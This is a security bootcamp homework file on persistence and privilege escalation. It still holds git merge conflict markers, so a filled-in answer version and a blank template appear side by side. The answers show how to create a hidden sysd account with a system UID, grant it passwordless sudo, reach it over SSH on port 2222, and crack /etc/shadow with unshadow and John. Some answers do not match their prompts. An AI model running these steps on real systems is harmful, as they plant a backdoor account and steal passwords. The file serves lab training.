<<<<<<< HEAD
## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:

         useradd -M sysd
![sysd](image\sysd.png)

2. Give your secret user a password: 

         passwd sysd
    ![password](image\password.png)

3. Give your secret user a system UID < 1000:

        usermod -u 997 sysd
    ![UIDandGID](image\UIDandGID.png)


4. Give your secret user the same GID:

        groupmod -g 997 sysd
    ![UIDandGID](image\UIDandGID.png)

5. Give your secret user full `sudo` access without the need for a password:

        
        visudo
        sysd ALL=(ALL) NOPASSWD:ALL
    ![sudo](image\sudo.png)
    



6. Test that `sudo` access works without your password:

        sudo -l
    ![sudofile](image\sudofile.png)

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

                sudo nano /etc/ssh/sshd_config
    ![sshfile.png](image\sshfile.png)
        

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:

        sudo systemctl restart ssh



2. Exit the `root` account:

        command exit or command su with the user account you want to switch to.

3. SSH to the target machine using your `sysd` account and port `2222`:

        ssh sysd@192.168.6.105 -p 2222
![sshsysd.png](image\sshsysd.png)

4. Use `sudo` to switch to the root user:

        sudo su 

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

        su sysd

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file: 

        unshadow passwd.txt shadow.txt > unshadowed.txt
        john --wordlist=/usr/share/john/password.lst unshadowed.txt



---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

=======
# Bootcamp-Security

         Week 6 Homework Submission File: Advanced Bash - Owning the System
Please edit this file by adding the solution commands on the line below the prompt.
Save and submit the completed file for your homework submission.
Step 1: Shadow People


Create a secret user named sysd. Make sure this user doesn't have a home folder created:

Your solution command here

        hello world



Give your secret user a password:

Your solution command here



Give your secret user a system UID < 1000:

Your solution command here



Give your secret user the same GID:

Your solution command here



Give your secret user full sudo access without the need for a password:

Your solution command here



Test that sudo access works without your password:

Your bash commands here




Step 2: Smooth Sailing


Edit the sshd_config file:

Your bash commands here




Step 3: Testing Your Configuration Update


Restart the SSH service:

Your solution command here



Exit the root account:

Your solution command here



SSH to the target machine using your sysd account and port 2222:

Your solution command here



Use sudo to switch to the root user:

Your solution command here



Step 4: Crack All the Passwords


SSH back to the system using your sysd account and port 2222:

Your solution command here



Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:

Your solution command here  
>>>>>>> 2619056d2767f9a581426d32e458ca20193dbc2e
